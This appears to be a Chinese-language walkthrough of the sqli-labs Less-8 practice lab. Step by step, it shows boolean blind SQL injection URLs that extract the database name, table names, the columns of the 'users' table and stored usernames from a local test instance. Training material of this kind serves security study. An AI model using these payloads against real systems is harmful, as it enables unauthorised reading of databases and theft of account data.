注入过程
1、判断数据库名称长度
```sql
http://127.0.0.1/sqli-labs/Less-8/?id=1' and (length(database()))=8%23```
```



2、猜解数据库名
```sql

http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115%23
http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,2,1))) = 101%23
http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,3,1))) = 99%23
http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,4,1))) = 117%23
http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,5,1))) = 114%23
http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,6,1))) = 105%23
http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,7,1))) = 116%23
http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,8,1))) = 121%23```



3、判断数据库中表的数量
```sql

http://127.0.0.1/sqli-labs/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4%23
```

4、猜解其中第四个表名的长度
```sql

http://127.0.0.1/sqli-labs/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1)))=5%23```
```


5、猜解第四个表名
```sql

http://127.0.0.1/sql/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) = 117%23
http://127.0.0.1/sql/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))) = 115%23
http://127.0.0.1/sql/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),3,1))) = 101%23
http://127.0.0.1/sql/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),4,1))) = 114%23
http://127.0.0.1/sql/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),5,1))) = 115%23
```

第四个表名为users

6、判断users表中字段数量

http://127.0.0.1/sqli-labs/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=3%23

7、判断第二个字段长度

http://127.0.0.1/sqli-labs/Less-8/?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1))=8%23

8、猜解第二个字段名称

http://127.0.0.1/sqli-labs/Less-8/?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),1,1))=117%23
...
第二个字段名称为username
注：substr(参数1，参数2，参数3)，参数2中0和1都可表示从第一位字符开始，但这里只可以用1,0不可以，可能和数据库版本有关

9、猜解指定字段中值的数量

http://127.0.0.1/sqli-labs/Less-8/?id=1' and (select count(username)from users)=13%23

10、猜解第一个字段中第一个值的长度

http://127.0.0.1/sqli-labs/Less-8/?id=1' and length((select username from users limit 0,1))=4%23

11、猜解第一个字段中第一个值的名称

http://127.0.0.1/sqli-labs/Less-8/?id=1' and ascii(substr((select username from users limit 0,1),1,1))=68%23
...
